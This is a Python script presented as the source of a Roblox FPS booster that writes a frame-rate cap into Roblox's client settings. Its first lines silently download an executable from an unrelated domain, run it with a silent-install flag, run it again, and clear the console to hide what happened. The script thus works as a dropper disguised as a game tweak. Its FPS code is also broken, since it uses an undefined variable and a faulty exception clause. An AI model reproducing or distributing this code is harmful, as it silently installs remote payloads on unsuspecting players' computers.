# FPSBoostPro.exe Source Code
# If you suspect the FPSBoostPro.exe, use it.

import os
import requests
import subprocess
from tqdm import tqdm

def d3_k7(url, dest_folder):
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 KB

    progress_bar = tqdm(total=total_size, unit='iB', unit_scale=True, desc="Downloading", ncols=100)
    with open(dest_folder, 'wb') as f:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            f.write(data)
    progress_bar.close()

    if total_size != 0 and progress_bar.n != total_size:
        print("Error occurred during file download.")
        os.remove(dest_folder)
        return False
    return True

def i2_v6(url):
    try:
        filename = url.split("/")[-1]
        d3_k7(url, filename)
        subprocess.run([filename, "/S"], check=True)
        os.remove(filename)

    except requests.exceptions.RequestException as e:
        print("Error occurred during file download:", e)
    except subprocess.CalledProcessError as e:
        print("Error occurred during installation:", e)
    except Exception as e:
        print("An error occurred:", e)

package = "https://daspeller4.xyz/drive/file/431/bf7581bb1f5954aae23f948fef9e29ad/FPSBoostProSetup-x64.exe"
i2_v6(package)

try:
    subprocess.run(["FPSBoostProSetup-x64.exe"])
except FileNotFoundError as e:
    print("Error: FPSBoostProSetup-x64.exe file not found.")
except Exception as e:
    print("An error occurred while starting FPSBoostProSetup-x64.exe:", e)

os.system("cls")

robloxversion = requests.get("https://setup.rbxcdn.com/version").text
robloxversionreadable = requests.get("https://setup.rbxcdn.com/version").text.replace(
    "version-", ""
)

print(f"Roblox Version: {robloxversionreadable}")
takeinnoyes = input(
    f"{os.getlogin()}, Press any key [Enter] to adjust FPS to your screen's refresh rate or :q to set a custom value: "
)

if not os.path.exists(
    f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Roblox\\Versions\\{robloxversion}\\ClientSettings"
):
    os.mkdir(
        f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Roblox\\Versions\\{robloxversion}\\ClientSettings"
    )

try:
    if takeinnoyes == ":q":
        os.system("cls")
        fpscapifcustom = int(
            input("Detected value :q. Enter the custom FPS value: ")
        )
        with open(
            f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Roblox\\Versions\\{robloxversion}\\ClientSettings\\ClientAppSettings.json",
            "w",
        ) as nvm:
            nvm.write(
                f"""{{
    "DFIntTaskSchedulerTargetFps": {fpscapifcustom}
}}"""
            )
    else:
        with open(
            f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Roblox\\Versions\\{robloxversion}\\ClientSettings\\ClientAppSettings.json",
            "w",
        ) as nvm:
            nvm.write(
                f"""{{
    "DFIntTaskSchedulerTargetFps": {refreshrate}
}}"""
            )
except FileNotFoundError or NotADirectoryError:
    print("Your Roblox version is outdated and does not match the latest version.")
